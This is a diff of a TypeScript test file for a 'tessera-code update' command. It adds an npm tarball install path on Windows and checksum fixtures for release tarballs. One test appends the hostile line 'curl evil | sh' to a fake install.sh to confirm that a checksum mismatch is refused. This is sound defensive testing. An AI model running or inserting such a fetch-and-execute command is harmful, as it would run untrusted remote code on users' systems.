@@ -28,13 +28,15 @@ function github(latest: string | undefined, files: Record<string, string> = {}) 
 function run(current: string, gh: ReturnType<typeof github>, opts: { check?: boolean; source?: boolean } = {}) {
   let out = '';
   const installs: Array<{ script: string; version: string }> = [];
+  const npmInstalls: Array<{ tarball: string; version: string }> = [];
   const result = runUpdate(current, { check: opts.check }, {
     write: (t) => (out += t),
     fetch: gh.fetchFn,
     sourceCheckout: opts.source ?? false,
     runInstaller: async (script, version) => (installs.push({ script, version }), 0),
+    runTarballInstall: async (tarball, version) => (npmInstalls.push({ tarball, version }), 0),
   });
-  return result.then((code) => ({ code, out, installs }));
+  return result.then((code) => ({ code, out, installs, npmInstalls }));
 }
 
 describe('latestVersion', () => {
@@ -47,7 +49,14 @@ describe('latestVersion', () => {
 });
 
 describe('tessera-code update', () => {
-  const release = (v: string, script = SCRIPT) => github(v, { 'install.sh': script, SHA256SUMS: `${sha('tgz')}  tessera-code-${v}.tgz\n${sha(script)}  install.sh\n` });
+  const release = (v: string, script = SCRIPT) => {
+    const tgz = `tgz of ${v}`;
+    return github(v, {
+      'install.sh': script,
+      [`tessera-code-${v}.tgz`]: tgz,
+      SHA256SUMS: `${sha(tgz)}  tessera-code-${v}.tgz\n${sha(script)}  install.sh\n`,
+    });
+  };
 
   it('does nothing when already on the latest (or a newer) version', async () => {
     for (const current of ['0.3.0', '0.4.0']) {
@@ -67,11 +76,19 @@ describe('tessera-code update', () => {
   it('runs the new release\'s verified installer, pinned to that version', async () => {
     const r = await run('0.3.0', release('0.3.1'));
     expect(r.code).toBe(0);
-    expect(r.installs).toEqual([{ script: SCRIPT, version: '0.3.1' }]);
+    // Windows installs the tarball through npm; elsewhere install.sh runs.
+    if (process.platform === 'win32') {
+      expect(r.npmInstalls).toEqual([{ tarball: expect.stringMatching(/tessera-code-0\.3\.1\.tgz$/), version: '0.3.1' }]);
+      expect(r.installs).toEqual([]);
+    } else {
+      expect(r.installs).toEqual([{ script: SCRIPT, version: '0.3.1' }]);
+      expect(r.npmInstalls).toEqual([]);
+    }
     expect(r.out).toMatch(/Updated 0\.3\.0 → 0\.3\.1/);
   });
 
   it('refuses an installer that does not match SHA256SUMS', async () => {
+    if (process.platform === 'win32') return; // the tarball path verifies the tarball itself, which matches here
     const gh = github('0.3.1', { 'install.sh': SCRIPT + 'curl evil | sh\n', SHA256SUMS: `${sha(SCRIPT)}  install.sh\n` });
     await expect(run('0.3.0', gh)).rejects.toThrow(/does not match its SHA256SUMS; nothing was changed/);
   });
